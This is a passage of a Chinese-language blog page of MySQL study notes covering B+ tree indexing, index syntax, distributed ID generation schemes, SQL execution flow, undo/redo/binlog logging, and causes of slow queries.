<li>B+树的高度一般只有2-4层，所以查找记录时最多只需要2-4次IO，相对二叉平衡树已经大大降低了。平衡二叉树的每个节点只有两个孩子节点，如果一张表的数据量特别大，整棵树的高度也会随之上升。一个千万级别的表如果用平衡二叉树作为索引的话，树高将会达到二十多层。这也就意味着做一次查询需要二十多次磁盘io，这是一个不小的开销。平衡二叉树的瓶颈在于一个节点只有两个孩子节点，而B树一个节点可以存放N个孩子节点，这就完美解决了树高的问题，我们可以把B树称为平衡多叉树</li>
<li>范围查找时，能通过叶子节点的指针获取数据。例如查找大于等于3的数据，当在叶子节点中查到3时，通过3的尾指针便能获取所有数据，而不需要再像二叉树一样再获取到3的父节点。</li>
</ol>
<h4 id="B树和B-树"><a href="#B树和B-树" class="headerlink" title="B树和B+树"></a>B树和B+树</h4><p>平衡二叉树的瓶颈在于一个节点只有两个孩子节点，而B树一个节点可以存放N个孩子节点，这就完美解决了树高的问题，我们可以把B树称为平衡多叉树，B树作为索引如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438194.png" alt="图片来源网络"></p>
<p>但是以B树的结构作为索引仍有可以优化的地方，我们先看看最终的B+树，再仔细分析B+树在B树的基础上作了哪些改进，为什么B+树最终能够胜任索引的工作： </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438215.png" alt="图片来源网络"></p>
<p>从图片中可以看到B+树同样是一棵多差平衡树，和B树一样很好地解决了树高的问题。</p>
<h3 id="改进点一："><a href="#改进点一：" class="headerlink" title="改进点一："></a>改进点一：</h3><p>但仔细看可以发现，B树的节点中既存储索引，也存储表对应的数据；而B+树的非叶子节点是不存储数据的，只存储索引，数据全部存储在叶子节点上。</p>
<p>为什么要做这样的改进？我们做一次算术就知道了。</p>
<p>假设树高为2，主键ID为bigint类型，长度为8字节，节点指针为6字节，一行数据记录的大小为1k，一次io操作能获得一页16k的数据。</p>
<p>在索引为B+树的情况下，根节点能存储：16k &#x2F; （6 + 8） &#x3D; 1170 条索引指针；到了第一层，一共能指向 1170 * 1170 &#x3D; 1368900 条索引指针；到了最底一层叶子节点，一个节点能存储16k &#x2F; 1k &#x3D; 16 条记录，一共能存储 1170 * 1170 * 16 &#x3D; 21902400 条记录</p>
<p>在B树的情况下，由于非叶子节点使用了大量空间存储数据，存放的索引指针肯定就少，最终整棵树如果想要存储和B+树一样多的数据就必须要增加树高，这样一来就增加了磁盘io，所以说B+树作为索引的性能比B树高。</p>
<h3 id="改进点二："><a href="#改进点二：" class="headerlink" title="改进点二："></a>改进点二：</h3><p>使用b树，数据存储在每一个节点中，搜索时会做局部中序遍历，如果查询多条数据，即需要跨层访问，仍然对搜索效率有不利影响; B+叶子节点之间使用指针连接，提高区间访问效率。如果我们要进行 范围查询，可以轻松通过B+树叶子节点之间的指针进行遍历，减少了不必要的磁盘io。</p>
<h4 id="为什么不常用哈希表和数组作为索引"><a href="#为什么不常用哈希表和数组作为索引" class="headerlink" title="为什么不常用哈希表和数组作为索引?"></a>为什么不常用哈希表和数组作为索引?</h4><p>哈希表虽然单一个值的查询效率很高，但是撑不住范围查询，哪个公司的业务还没个范围查询呢？</p>
<p>而数组虽然查询的效率高，但是增加和删除的效率低，由于记录在增加和删除的时候索引也得跟着维护，这会导致大数据量的情况下，增加或删除一条记录效率较低。如果没有增删, 且按id查询, id递增,只有范围查询和单条查询,可以用数组做索引</p>
<h3 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h3><p>一个索引包含所有需要查询的字段的值,不需要回表;</p>
<p>例如: select id,name where name&#x3D;’shenjian’ 此时索引包含了所需要查询的字段的值, 不需要回表;</p>
<h3 id="最左前缀原则"><a href="#最左前缀原则" class="headerlink" title="最左前缀原则"></a>最左前缀原则</h3><p>加联合索引(name, city)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span>xx <span class="keyword">and</span> city<span class="operator">=</span>xx ; ／／可以命中索引</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span>xx ; <span class="operator">/</span><span class="operator">/</span> 可以命中索引</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> city<span class="operator">=</span>xx ; <span class="operator">/</span><span class="operator">/</span> 无法命中索引            </span><br></pre></td></tr></table></figure>

<h3 id="联合索引问题"><a href="#联合索引问题" class="headerlink" title="联合索引问题"></a>联合索引问题</h3><p>abc</p>
<h3 id="注意避免索引冗余"><a href="#注意避免索引冗余" class="headerlink" title="注意避免索引冗余"></a>注意避免索引冗余</h3><p>(name,city)和(name)冗余</p>
<h3 id="如何添加索引"><a href="#如何添加索引" class="headerlink" title="如何添加索引"></a>如何添加索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span>主键索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span> 唯一索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name ( `<span class="keyword">column</span>` ) <span class="operator">/</span><span class="operator">/</span>普通索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> FULLTEXT ( `<span class="keyword">column</span>`)  <span class="operator">/</span><span class="operator">/</span> 全文索引</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name ( `column1`, `column2`, `column3` ) <span class="operator">/</span><span class="operator">/</span>多行索引</span><br></pre></td></tr></table></figure>

<h2 id="分库分表后-id主键如何处理"><a href="#分库分表后-id主键如何处理" class="headerlink" title="分库分表后,id主键如何处理?"></a>分库分表后,id主键如何处理?</h2><p>因为要是分成多个表之后，每个表都是从 1 开始累加，这样是不对的，我们需要一个全局唯一的 id 来支持。</p>
<p>生成全局 id 有下面这几种方式：</p>
<ul>
<li><p>UUID(universally unique identifier)：不适合作为主键，因为太长了，并且无序不可读，查询效率低。比较适合用于生成唯一的名字的标示比如文件的名字。</p>
<blockquote>
<p>为什么无序的UUID会导致入库性能变差呢？</p>
<p>这就涉及到 B+树索引的分裂：众所周知，关系型数据库的索引大都是B+树的结构，拿ID字段来举例，索引树的每一个节点都存储着若干个ID。如果我们的ID按递增的顺序来插入，比如陆续插入8，9，10，新的ID都只会插入到最后一个节点当中。当最后一个节点满了，会裂变出新的节点。这样的插入是性能比较高的插入，因为这样节点的分裂次数最少，而且充分利用了每一个节点的空间。但是，如果我们的插入完全无序，不但会导致一些中间节点产生分裂，也会白白创造出很多不饱和的节点，这样大大降低了数据库插入的性能。</p>
<p>信息不安全：基于MAC地址生成UUID的算法可能会造成MAC地址泄露，这个漏洞曾被用于寻找梅丽莎病毒的制作者位置。</p>
</blockquote>
</li>
<li><p>数据库自增 id : 两台数据库分别设置不同步长，生成不重复ID的策略来实现高可用。这种方式生成的 id 有序，但是需要独立部署数据库实例，成本高，还会有性能瓶颈。</p>
</li>
<li><p>利用 redis 生成 id : 性能比较好，灵活方便，不依赖于数据库。但是，引入了新的组件造成系统更加复杂，可用性降低，编码更加复杂，增加了系统成本。</p>
</li>
<li><p>Twitter的snowflake算法 ：Github 地址：<a href="https://github.com/twitter-archive/snowflake%E3%80%82">https://github.com/twitter-archive/snowflake。</a></p>
<blockquote>
<p>优点: 1.生成ID不依赖于DB,完全在内存生成,高性能高可用 2. ID呈趋势递增,后续插入索引树的时候性能较好</p>
<p>缺点: 依赖于系统时钟的一致性. 如果某台机器的系统是时钟回拨,有可能造成ID冲突,或者ID乱序.id递增还可能会有信息安全问题,竞争对手可能会通过这个id知道公司一天的单量.</p>
</blockquote>
</li>
<li><p>美团的Leaf分布式ID生成系统 ：Leaf 是美团开源的分布式ID生成器，能保证全局唯一性、趋势递增、单调递增、信息安全，里面也提到了几种分布式方案的对比，但也需要依赖关系数据库、Zookeeper等中间件。美团技术团队的一篇文章：<a href="https://tech.meituan.com/2017/04/21/mt-leaf.html">https://tech.meituan.com/2017/04/21/mt-leaf.html</a> 。</p>
<blockquote>
<p>leaf-segment数据库方案: </p>
<p>优点：</p>
<ul>
<li>Leaf服务可以很方便的线性扩展，性能完全能够支撑大多数业务场景。</li>
<li>ID号码是趋势递增的8byte的64位数字，满足上述数据库存储的主键要求。</li>
<li>容灾性高：Leaf服务内部有号段缓存，即使DB宕机，短时间内Leaf仍能正常对外提供服务。</li>
<li>可以自定义max_id的大小，非常方便业务从原有的ID方式上迁移过来。</li>
</ul>
<p>缺点：</p>
<ul>
<li>ID号码不够随机，能够泄露发号数量的信息，不太安全。</li>
<li>TP999(TP999就是满足千分之九百九十九的网络请求所需要的最低耗时)数据波动大，当号段使用完之后还是会hang在更新数据库的I&#x2F;O上，tp999数据会出现偶尔的尖刺。</li>
<li>DB宕机会造成整个系统不可用</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="一条SQL语句在MySQL中如何执行的"><a href="#一条SQL语句在MySQL中如何执行的" class="headerlink" title="一条SQL语句在MySQL中如何执行的"></a>一条SQL语句在MySQL中如何执行的</h2><ul>
<li><p>server层: 连接,查询缓存,分析,优化,执行</p>
<ul>
<li><p>连接器: 登录数据库,分析权限,建立连接,在连接不断开的情况下,即使管理员修改这个用户的权限也不会生效</p>
</li>
<li><p>查询缓存(mysql8.0 版本后移除) : 查询缓存主要用来缓存我们所执行的 SELECT 语句以及该语句的结果集。</p>
<p>连接建立后，执行查询语句的时候，会先查询缓存，MySQL 会先校验这个 sql 是否执行过，以 Key-Value 的形式缓存在内存中，Key 是查询预计，Value 是结果集。如果缓存 key 被命中，就会直接返回给客户端，如果没有命中，就会执行后续的操作，完成后也会把结果缓存起来，方便下一次调用。当然在真正执行缓存查询的时候还是会校验用户的权限，是否有该表的查询条件。</p>
<p>MySQL 查询不建议使用缓存，因为查询缓存失效在实际业务场景中可能会非常频繁，假如你对一个表更新的话，这个表上的所有的查询缓存都会被清空。对于不经常更新的数据来说，使用缓存还是可以的。</p>
<p>所以，一般在大多数情况下我们都是不推荐去使用查询缓存的。</p>
<p>MySQL 8.0 版本后删除了缓存的功能，官方也是认为该功能在实际的应用场景比较少，所以干脆直接删掉了。</p>
</li>
<li><p>分析器: </p>
<ul>
<li><p>词法分析: 一条 SQL 语句有多个字符串组成，首先要提取关键字，比如 select，提出查询的表，提出字段名，提出查询条件等等。做完这些操作后，就会进入第二步。</p>
</li>
<li><p>语法分析: 主要就是判断你输入的 sql 是否正确，是否符合 MySQL 的语法。</p>
<p>完成这 2 步之后，MySQL 就准备开始执行了，但是如何执行，怎么执行是最好的结果呢？这个时候就需要优化器上场了。</p>
</li>
</ul>
</li>
<li><p>优化器: 优化器的作用就是它认为的最优的执行方案去执行（有时候可能也不是最优），比如多个索引的时候该如何选择索引，多表查询的时候如何选择关联顺序等。</p>
<p>可以说，经过了优化器之后可以说这个语句具体该如何执行就已经定下来。</p>
</li>
<li><p>执行器: 当选择了执行方案后,mysql就准备开始执行了,首先执行前会检验该用户有没有权限,如果没有权限,就会返回错误信息,如果有权限,就会去调用引擎的接口,返回接口执行的结果</p>
</li>
</ul>
</li>
<li><p>存储引擎: 主要负责数据的存储和读取，采用可以替换的插件式架构，支持 InnoDB、MyISAM、Memory 等多个存储引擎，其中 InnoDB 引擎有自有的日志模块 redolog 模块。<strong>现在最常用的存储引擎是 InnoDB，它从 MySQL 5.5.5 版本开始就被当做默认存储引擎了。</strong></p>
</li>
</ul>
<p>MySQL 主要分为 Server 层和引擎层，Server 层主要包括连接器、查询缓存、分析器、优化器、执行器，同时还有一个日志模块（binlog），这个日志模块所有执行引擎都可以共用,redolog 只有 InnoDB 有。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438635.png" alt="img"></p>
<h3 id="一条更新语句执行的顺序"><a href="#一条更新语句执行的顺序" class="headerlink" title="一条更新语句执行的顺序"></a>一条更新语句执行的顺序</h3><p>update T set c&#x3D;c+1 where ID&#x3D;2;</p>
<ul>
<li>执行器先找引擎取 ID&#x3D;2 这一行。ID 是主键，引擎直接用树搜索找到这一行。如果 ID&#x3D;2 这一行所在的数据页本来就在内存中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。如果内存不足, 则需要页面置换(最佳置换, 先进先出, 最近最近未用, 时钟置换算法(只有一个访问位),改进型时钟置换算法(有一个访问和修改位,优先淘汰没有修改过的页面) )</li>
<li>执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是 N+1，得到新的一行数据，再调用引擎接口写入这行新数据。</li>
<li>引擎将这行新数据更新到内存中，同时将这个更新操作记录到 redo log 里面，此时 redo log 处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。</li>
<li>执行器生成这个操作的binlog，并把 binlog 写入磁盘(FIFS, 最短寻道时间, 扫描算法, 循环扫描算法)。</li>
<li>执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 改成提交（commit）状态，更新完成。</li>
</ul>
<h2 id="Undo-log、-Redo-log、Binary-log"><a href="#Undo-log、-Redo-log、Binary-log" class="headerlink" title="Undo log、 Redo log、Binary log"></a>Undo log、 Redo log、Binary log</h2><h3 id="undo和redo"><a href="#undo和redo" class="headerlink" title="undo和redo"></a>undo和redo</h3><p>在数据库系统中，既有存放数据的文件，也有存放日志的文件。日志在内存中也是有缓存Log buffer，也有磁盘文件log file。MySQL中的日志文件，有这么两类与事务有关：undo日志与redo日志。</p>
<h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>持久性和原子性可以利用undo log来实现</p>
<p>原理: 为了满足事务的原子性,在操作任何数据之前,首先将数据备份到undo log. 然后进行数据的修改. 如果出现了错误或者用户执行了ROLLBACK语句,系统可以利用Undo log 中的备份数据将数据恢复到事务开始之前的状态.</p>
<p>数据库写入数据到磁盘之前, 会把数据先缓存在内存中,事务提交时才会写入磁盘中.</p>
<p>用undo log 实现原子性和持久性的事务的简化过程: </p>
<p>假设有A、B两个数据,值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log buffer.<br> C. 修改A&#x3D;3.<br> D. 记录B&#x3D;2到undo log buffer.<br> E. 修改B&#x3D;4.<br> F. 将undo log buffer写到磁盘。<br> G. 将数据写到磁盘。<br> H. 事务提交</p>
<ul>
<li><p>如何保证原子性？</p>
<p>在修改数据到磁盘前，会先记录undo log，并将undo log持久化到硬盘</p>
</li>
<li><p>如何保证持久性？</p>
<p>在事务提交之前，把内存中缓存的数据写入磁盘。这样事务提交时，可以确定数据是已经持久化的，不会丢失。</p>
</li>
<li><p>若系统在G和H之间崩溃</p>
<p>此时事务并未提交，需要回滚。而undo log已经被持久化，可以根据undo log来恢复数据</p>
</li>
<li><p>若系统在G之前崩溃</p>
<p>此时数据并未持久化到硬盘，依然保持在事务之前的状态</p>
</li>
</ul>
<p><strong>缺陷：</strong>每个事务提交前将数据和Undo Log写入磁盘，这样会导致大量的磁盘IO，因此性能很低。</p>
<p>如果能够将数据缓存一段时间，就能减少IO提高性能。但是这样就会丧失事务的持久性。因此引入了另外一种机制来实现持久化，即<strong>Redo Log</strong>.</p>
<h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>和Undo Log相反，Redo Log记录的是<strong>新数据</strong>的备份。<strong>在事务提交前，只要将Redo Log持久化即可，不需要将数据持久化，减少了IO的次数。</strong></p>
<p>先来看下基本原理：</p>
<blockquote>
<p><strong>Undo + Redo事务的简化过程</strong></p>
</blockquote>
<p> 假设有A、B两个数据，值分别为1,2</p>
<p> A. 事务开始.<br> B. 记录A&#x3D;1到undo log buffer.<br> C. 修改A&#x3D;3.<br> D. 记录A&#x3D;3到redo log buffer.<br> E. 记录B&#x3D;2到undo log buffer.<br> F. 修改B&#x3D;4.<br> G. 记录B&#x3D;4到redo log buffer.<br> H. 将undo log buffer写入redo log buffer<br> I. 将redo log写入磁盘<br> J. 事务提交</p>
<p>k.最后再将数据写回磁盘(不一定立刻写回)</p>
<blockquote>
<p>安全和性能问题</p>
</blockquote>
<ul>
<li><p>如何保证原子性？</p>
<p>如果在事务提交前故障，通过undo log日志恢复数据。如果undo log都还没写入，那么数据就尚未持久化，无需回滚</p>
</li>
<li><p>如何保证持久化？</p>
<p>大家会发现，这里并没有出现数据的持久化。因为数据已经写入redo log，而redo log持久化到了硬盘，因此只要到了I以后，事务是可以提交的。</p>
</li>
<li><p>内存中的数据库数据何时持久化到磁盘？</p>
<p>因为redo log已经持久化，因此数据库数据写入磁盘与否影响不大，不过为了避免出现脏数据（内存中与磁盘不一致），事务提交后也会将内存数据刷入磁盘（也可以按照固设定的频率刷新内存数据到磁盘中）。</p>
</li>
<li><p>持久化redo和持久化数据库数据有什么性能差异？</p>
<ul>
<li><p>数据库数据写入是随机IO，性能很差</p>
</li>
<li><p>redo log在初始化时会开辟一段连续的空间，写入是顺序IO，性能很好</p>
</li>
</ul>
</li>
<li><p>redo log中记录的数据，有可能尚未提交，那么如何完成数据恢复？</p>
<p>数据恢复有两种策略：</p>
<ul>
<li>恢复时，只重做已经提交了的事务</li>
<li>恢复时，重做所有事务包括未提交的事务和回滚了的事务。然后通过Undo Log回滚那些未提交的事务</li>
</ul>
<p>Inodb引擎采用的是第二种方案，因此undo log要在 redo log前持久化</p>
</li>
<li><p>写入性能的优化</p>
<p>事务提交前需要同时写入undo log和 redo log，势必增加IO次数，因此实际上undo log并不是直接写入磁盘，而是先写入到redo log中，当redo log持久化时，undo log就同时持久化到硬盘了。</p>
<p>因此事务提交前，只需要对redo log持久化即可。</p>
<p>另外，redo log并不是写入一次就持久化一次，redo log在内存中也有自己的缓冲池：<code>redo log buffer</code>。每次写redo log都是写入到buffer，在提交时一次性持久化到磁盘，减少IO此时。</p>
</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>最后总结一下：</p>
<ul>
<li>undo log 记录更新前数据，用于保证事务原子性</li>
<li>redo log 记录更新后数据，用于保证事务的持久性</li>
<li>redo log有自己的内存buffer，先写入到buffer，事务提交时写入磁盘</li>
<li>redo log持久化之后，意味着事务是<strong>可提交</strong>的</li>
</ul>
<h3 id="redo-log日志模块"><a href="#redo-log日志模块" class="headerlink" title="redo log日志模块"></a>redo log日志模块</h3><p>redo log是InnoDB存储引擎层的日志，又称重做日志文件，用于记录事务操作的变化，记录的是数据修改之后的值，不管事务是否提交都会记录下来。在实例和介质失败（media failure）时，redo log文件就能派上用场，如数据库掉电，InnoDB存储引擎会使用redo log恢复到掉电前的时刻，以此来保证数据的完整性。</p>
<p>在一条更新语句进行执行的时候，InnoDB引擎会把更新记录写到redo log日志中，然后更新内存，此时算是语句执行完了，然后在空闲的时候或者是按照设定的更新策略将redo log中的内容更新到磁盘中，这里涉及到WAL即Write Ahead logging技术，他的关键点是先写日志，再写磁盘。</p>
<p>有了redo log日志，那么在数据库进行异常重启的时候，可以根据redo log日志进行恢复，也就达到了crash-safe。</p>
<p>redo log日志的大小是固定的，即记录满了以后就从头循环写。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438630.jpg" alt="img"></p>
<p>该图展示了一组4个文件的redo log日志，checkpoint之前表示擦除完了的，即可以进行写的，擦除之前会更新到磁盘中，write pos是指写的位置，当write pos和checkpoint相遇的时候表明redo log已经满了，这个时候数据库停止进行数据库更新语句的执行，转而进行redo log日志同步到磁盘中。</p>
<h4 id="redo-log机制："><a href="#redo-log机制：" class="headerlink" title="redo log机制："></a>redo log机制：</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438643.jpg" alt="必须了解的mysql三大日志-binlog、redo log和undo log"></p>
<ul>
<li>由两部分组成，一个是内存中的redo log buffer，另一个是磁盘的 redo log file</li>
<li>每次对数据进行修改，先写进buffer中，后续某个时间点再一次将多个操作记录写道redo log file中</li>
<li>三种写入级别<ul>
<li>延迟写，延迟刷新，参数0，适合普通数据，每隔一秒刷新到磁盘一次</li>
<li>实时写，实时刷新，参数1，适合金融数据，写到内存的同时直接刷新到磁盘</li>
<li>实时写，延迟刷新，参数2，适合订单数据，每次提交立马写入os buffer，每隔一秒刷到磁盘</li>
</ul>
</li>
</ul>
<h3 id="binlog日志模块"><a href="#binlog日志模块" class="headerlink" title="binlog日志模块"></a>binlog日志模块</h3><p>binlog是属于MySQL Server层面的，又称为归档日志，属于逻辑日志，是以二进制的形式记录的是这个语句的原始逻辑，依靠binlog是没有crash-safe能力的</p>
<h3 id="redo-log和binlog区别"><a href="#redo-log和binlog区别" class="headerlink" title="redo log和binlog区别"></a>redo log和binlog区别</h3><ul>
<li>redo log是属于innoDB层面，binlog属于MySQL Server层面的，这样在数据库用别的存储引擎时可以达到一致性的要求。</li>
<li>redo log是物理日志，记录该数据页更新的内容；binlog是逻辑日志，记录的是这个更新语句的原始逻辑</li>
<li>redo log是循环写，日志空间大小固定；binlog是追加写，是指一份写到一定大小的时候会更换下一个文件，不会覆盖。</li>
<li>binlog可以作为恢复数据使用，主从复制搭建，redo log作为异常宕机或者介质故障后的数据恢复使用。</li>
</ul>
<h3 id="一条更新语句执行的顺序-1"><a href="#一条更新语句执行的顺序-1" class="headerlink" title="一条更新语句执行的顺序"></a>一条更新语句执行的顺序</h3><p>update T set c&#x3D;c+1 where ID&#x3D;2;</p>
<ul>
<li>执行器先找引擎取 ID&#x3D;2 这一行。ID 是主键，引擎直接用树搜索找到这一行。如果 ID&#x3D;2 这一行所在的数据页本来就在内存中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。</li>
<li>执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是N+1，得到新的一行数据，再调用引擎接口写入这行新数据。</li>
<li>引擎将这行新数据更新到内存中，同时将这个更新操作记录到 redo log 里面，此时 redo log 处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。</li>
<li>执行器生成这个操作的 binlog，并把 binlog 写入磁盘。</li>
<li>执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 改成提交（commit）状态，更新完成。</li>
</ul>
<p>这个update语句的执行流程图，图中浅色框表示是在 InnoDB 内部执行的，深色框表示是在执行器中执行的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438725.png" alt="img"></p>
<p><a href="https://www.linuxidc.com/Linux/2018-11/155431.htm">https://www.linuxidc.com/Linux/2018-11/155431.htm</a></p>
<h3 id="redo-log-1"><a href="#redo-log-1" class="headerlink" title="redo log"></a>redo log</h3><p><strong>作用：</strong></p>
<p>确保事务的持久性。防止在发生故障的时间点，尚有脏页未写入磁盘，在重启mysql服务的时候，根据redo log进行重做，从而达到事务的持久性这一特性。</p>
<p>redo log通常是物理日志，记录的是数据页的物理修改，而不是某一行或某几行修改成怎样怎样，它用来恢复提交后的物理数据页(恢复数据页，且只能恢复到最后一次提交的位置)。</p>
<h3 id="undo-log-1"><a href="#undo-log-1" class="headerlink" title="undo log"></a>undo log</h3><p><strong>作用：</strong></p>
<p>保存了事务发生之前的数据的一个版本，可以用于回滚，同时可以提供多版本并发控制下的读（MVCC），也即非锁定读</p>
<p>undo用来回滚行记录到某个版本。undo log一般是逻辑日志，根据每行记录进行记录。</p>
<h3 id="binlog-监听binary-log"><a href="#binlog-监听binary-log" class="headerlink" title="binlog   监听binary log"></a>binlog   监听binary log</h3><p><strong>作用：</strong></p>
<p>用于复制，在主从复制中，从库利用主库上的binlog进行重播，实现主从同步。<br>用于数据库的基于时间点的还原。</p>
<p><a href="https://blog.csdn.net/u012834750/article/details/79533866">https://blog.csdn.net/u012834750/article/details/79533866</a></p>
<p>-——————————————————-</p>
<p>数据库数据存放的文件称为data file；日志文件称为log file；数据库数据是有缓存的，如果没有缓存，每次都写或者读物理disk，那性能就太低下了。数据库数据的缓存称为data buffer，日志（redo）缓存称为log buffer；既然数据库数据有缓存，就很难保证缓存数据（脏数据）与磁盘数据的一致性。比如某次数据库操作：</p>
<p>update driver_info set driver_status &#x3D; 2 where driver_id &#x3D; 10001;</p>
<p>update T set age&#x3D;20 where ID&#x3D;2;</p>
<p>更新age字段的数据会存放在缓存中，等待存储引擎将age刷新data_file，并返回给业务方更新成功。如果此时数据库宕机，缓存中的数据就丢失了，业务方却以为更新成功了，数据不一致，也没有持久化存储。</p>
<p>上面的问题就可以通过事务的ACID特性来保证。</p>
<p>BEGIN trans；</p>
<p>update T set age&#x3D;20 where ID&#x3D;2;</p>
<p>COMMIT;</p>
<p>这样执行后，更新要么成功，要么失败。业务方的返回和数据库data file中的数据保持一致。要保证这样的特性这就不得不说存储引擎innodb的redo和undo日志。</p>
<p>redo日志、undo日志：</p>
<p>存储引擎也会为redo undo日志开辟内存缓存空间，log buffer。磁盘上的日志文件称为log file，是顺序追加的，性能非常高，注：磁盘的顺序写性能比内存的写性能差不了多少。</p>
<p>undo日志用于记录事务开始前的状态，用于事务失败时的回滚操作；redo日志记录事务执行后的状态，用来恢复未写入data file的已成功事务更新的数据。例如某一事务的事务序号为T1，其对数据X进行修改，设X的原值是5，修改后的值为15，那么Undo日志为&lt;T1, X, 5&gt;，Redo日志为&lt;T1, X, 15&gt;。</p>
<p>梳理下事务执行的各个阶段：</p>
<p>（1）写undo日志到log buffer；</p>
<p>（2）执行事务，并写redo日志到log buffer；</p>
<p>（3）如果innodb_flush_log_at_trx_commit&#x3D;1，则将redo日志写到log file，并刷新磁盘。</p>
<p>（4）提交事务。</p>
<p>可能有同学会问，为什么没有写data file，事务就提交了？</p>
<p>在数据库的世界里，数据从来都不重要，日志才是最重要的，有了日志就有了一切。</p>
<p>因为data buffer中的数据会在合适的时间 由存储引擎写入到data file，如果在写入之前，数据库宕机了，根据磁盘的redo日志，完全可以将事务更改的数据恢复。好了，看出日志的重要性了吧。先持久化日志的策略叫做Write Ahead Log，即预写日志。</p>
<p>分析几种异常情况：</p>
<ul>
<li>innodb_flush_log_at_trx_commit&#x3D;2（<a href="http://link.zhihu.com/?target=https://mp.weixin.qq.com/s?__biz=MzU4NjQwNTE5Ng==&mid=2247483681&idx=1&sn=03adfb89521568013f6a1efd9ca1af6a&scene=21%23wechat_redirect">innodb_flush_log_at_trx_commit和sync_binlog参数详解</a>）时，将redo日志写入logfile后，为提升事务执行的性能，存储引擎并没有调用文件系统的sync操作，将日志落盘。如果此时宕机了，那么未落盘redo日志事务的数据是无法保证一致性的。</li>
<li>undo日志同样存在未落盘的情况，可能出现无法回滚的情况。</li>
</ul>
<p>checkpoint：</p>
<p>checkpoint是为了定期将db buffer的内容刷新到data file。当遇到内存不足、db buffer已满等情况时，需要将db buffer中的内容&#x2F;部分内容（特别是脏数据）转储到data file中。在转储时，会记录checkpoint发生的”时刻“。在故障回复时候，只需要redo&#x2F;undo最近的一次checkpoint之后的操作。</p>
<p><a href="https://blog.csdn.net/bluejoe2000/article/details/80349499">https://blog.csdn.net/bluejoe2000/article/details/80349499</a></p>
<h2 id="一条SQL执行很慢的原因有哪些"><a href="#一条SQL执行很慢的原因有哪些" class="headerlink" title="一条SQL执行很慢的原因有哪些?"></a>一条SQL执行很慢的原因有哪些?</h2><p>分两类讨论</p>
<h3 id="大多数情况正常-只是偶尔出现很慢的情况"><a href="#大多数情况正常-只是偶尔出现很慢的情况" class="headerlink" title="大多数情况正常,只是偶尔出现很慢的情况"></a>大多数情况正常,只是偶尔出现很慢的情况</h3><p>1.数据库在刷脏页</p>
<p>刷脏页有4种情况:</p>
<ul>
<li>redolog写满了</li>
<li>内存不够用了: 如果一次查询较多的数据,恰好碰到所查的数据页不在内存中,需要申请内存,而此时恰好内存不足的时候就需要淘汰一部分内存数据页,如果是干净页,就直接释放,如果恰好是脏页就需要刷脏页.</li>
<li>mysql认为系统空闲的时候</li>
<li>mysql正常关闭的时候</li>
</ul>
<p>2.拿不到锁</p>
<p>我们要执行的这条语句，刚好这条语句涉及到的<strong>表</strong>，别人在用，并且加锁了，我们拿不到锁，只能慢慢等待别人释放锁了。或者，表没有加锁，但要使用到的某个一行被加锁了，这个时候，我也没办法啊。</p>
<p>如果要判断是否真的在等待锁，我们可以用 <strong>show processlist</strong>这个命令来查看当前的状态哦，这里我要提醒一下，有些命令最好记录一下，反正，我被问了好几个命令，都不知道怎么写，呵呵。</p>
<h3 id="针对一直这么慢的情况"><a href="#针对一直这么慢的情况" class="headerlink" title="针对一直这么慢的情况"></a>针对一直这么慢的情况</h3><p>没用到索引</p>
<p>1.字段没有索引</p>
<p>2.字段有索引,但没有用上</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c <span class="operator">-</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> pow(c,<span class="number">2</span>) <span class="operator">=</span> <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>

<p>3.数据库算错了索引</p>
